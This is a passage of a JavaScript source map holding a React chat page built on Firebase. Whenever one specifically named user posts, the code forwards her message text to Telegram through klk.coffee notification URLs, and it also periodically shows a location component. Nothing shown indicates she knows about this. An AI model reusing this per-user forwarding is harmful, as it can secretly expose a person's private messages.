console.log(error.message);\r\n                    toast.error(error.message);\r\n                    sendTelegramMessage(`replyImageUrl update error: ${error.message}`);\r\n                });\r\n        }\r\n    }, [replyImageUrl])\r\n\r\n    //預設 5 秒鐘後移除使用者位置元件\r\n    useEffect(() => {\r\n        setTimeout(() => {\r\n            setIsUserLocation(false);\r\n        }, 5000);\r\n\r\n        //每隔 3 分鐘顯示一次使用者位置元件, 啟用後 5 秒鐘關閉\r\n        setInterval(() => {\r\n            (() => {\r\n                setIsUserLocation(true);\r\n                setTimeout(() => {\r\n                    setIsUserLocation(false);\r\n                }, 5000);\r\n            })();\r\n        }, userLocationCacheInterval);\r\n    }, [])\r\n\r\n    const RenderUserLocation = () => {\r\n        return (isUserLocation ? <UserLocation /> : <Fragment></Fragment>);\r\n    }\r\n\r\n    const messageUpdate = (snapshot) => {\r\n        const data = snapshot.val();\r\n        if (data !== null && data !== undefined) {\r\n            // 最多顯示 70 則訊息\r\n            const sliceData = _.slice(_.values(data), -maxMessageNumber);\r\n\r\n            // 最新一則 Po 文的使用者\r\n            const currentSendMsgUser = _.slice(_.values(sliceData), -1)[0].user;\r\n\r\n            // 最新一則 Po 文的訊息 ID (改採用 Po 文時間)\r\n            const currentSendMsgId = _.slice(_.values(sliceData), -1)[0].createOn;\r\n\r\n            // 若最新 Po 文的使用者不是自己(當下登入帳號), 則不要將 Reply Message 清空, 以免尚未回覆的訊息消失\r\n            if (user === currentSendMsgUser) {\r\n                setReplyMessage(\"\");\r\n                setAllChatMessageInfo(sliceData);\r\n            }\r\n            else {\r\n                setAllChatMessageInfo(sliceData);\r\n            }\r\n        }\r\n    }\r\n\r\n    const onReplyClick = event => {\r\n        try {\r\n            if (user && replyMessage !== \"\") {\r\n                const messageInfo = {\r\n                    user: user,\r\n                    message: replyMessage,\r\n                    createOn: Date.now()\r\n                }\r\n\r\n                const newPostKey = push(child(DatabaseRef(db), 'chatMsg')).key;\r\n\r\n                let data = {};\r\n                data[newPostKey] = messageInfo;\r\n\r\n                let isSendMessageSuccess = false;\r\n\r\n                update(chatMsgRef, data)\r\n                    .then(() => {\r\n                        // Data saved successfully!\r\n                        if (user === linda) {\r\n                            const notifyMessage = `https://klk.coffee/auto?update=true&message=${replyMessage}`;\r\n                            sendTelegramMessage(notifyMessage);\r\n                            isSendMessageSuccess = true;\r\n                        }\r\n                    })\r\n                    .catch((error) => {\r\n                        // The write failed...\r\n                        if (error) {\r\n                            let message;\r\n                            if (error.message) {\r\n                                message = error.message;\r\n                            } else {\r\n                                message = JSON.stringify(error);\r\n                            }\r\n\r\n                            console.log(message);\r\n                            toast.error(message);\r\n                            sendTelegramMessage(`onReplyClick update error: ${message}`);\r\n                        }\r\n\r\n                        if (user === linda) {\r\n                            const notifyMessage = `https://klk.coffee/auto?update=false&message=${replyMessage}`;\r\n                            sendTelegramMessage(notifyMessage);\r\n                        }\r\n                    });\r\n\r\n                if (user === linda) {\r\n                    const notifyMessage = `https://klk.coffee/auto?message=${replyMessage}`;\r\n                    sendTelegramMessage(notifyMessage);\r\n                }\r\n\r\n                setTimeout(() => {\r\n                    if (isSendMessageSuccess === false) {\r\n                        toast.error(\"已斷線, 請重新登入\", { autoClose: 10000 });\r\n                        sendTelegramMessage(\"已斷線, 請重新登入\");\r\n                    }\r\n                }, 2000);\r\n            }\r\n        } catch (error) {\r\n            if (user === linda) {\r\n                const notifyMessage = `https://klk.coffee/auto?update=false&error=${error.message}`;\r\n                sendTelegramMessage(notifyMessage);\r\n            }\r\n        }\r\n    }\r\n\r\n    const onUpdateClick = event => {\r\n        if (user) {\r\n            const number = maxMessageNumber + 1;\r\n            reduxDispatch(chatTypes.SET_MAX_MESSAGE_NUMBER, number);\r\n        }\r\n\r\n        if (user === linda) {\r\n            const notifyMessage = \"https://klk.coffee/update\";\r\n            sendTelegramMessage(notifyMessage);\r\n        }\r\n    }\r\n\r\n    return (\r\n        <div className={classes.section}>\r\n            <GridContainer justify=\"center\">\r\n                <GridItem xs={12} sm={8} md={8}>\r\n                    <div>\r\n                        {allChatMessageInfo ? allChatMessageInfo.map((value, index) => {\r\n                            return (\r\n                                <ChatMessage\r\n                                    key={value.id !== undefined ? value.id : index}\r\n                                    avatar={avatarUser(value.user)}\r\n                                    title={mediaTitle(value)}\r\n                                    message={value.message}\r\n                                />\r\n                            )\r\n                        }) : <div></div>}\r\n                        <ChatInput\r\n                            avatar={avatarUser(user)}\r\n                            value={replyMessage}\r\n                            onChange={(e) => { setReplyMessage(e.target.value) }}\r\n                            onReply={onReplyClick}\r\n                            onUpdate={onUpdateClick}\r\n                            enableUpdate={true}\r\n                            setReplyImageUrl={setReplyImageUrl}\r\n                            enableImageUpload={true}\r\n                        />\r\n                    </div>\r\n                </GridItem>\r\n            </GridContainer>\r\n            <FloatyAssistant></FloatyAssistant>\r\n            <ToastContainer\r\n                theme='dark'\r\n                position=\"bottom-center\"\r\n                autoClose={1000}\r\n                hideProgressBar={false}\r\n                newestOnTop={false}\r\n                closeOnClick\r\n                rtl={false}\r\n                pauseOnFocusLoss\r\n                draggable\r\n                pauseOnHover\r\n            />\r\n            <AutoLogin />\r\n            {RenderUserLocation()}\r\n        </div>\r\n    );\r\n}\r\n\r\nexport default withRouter(UserChatPage);"],"sourceRoot":""}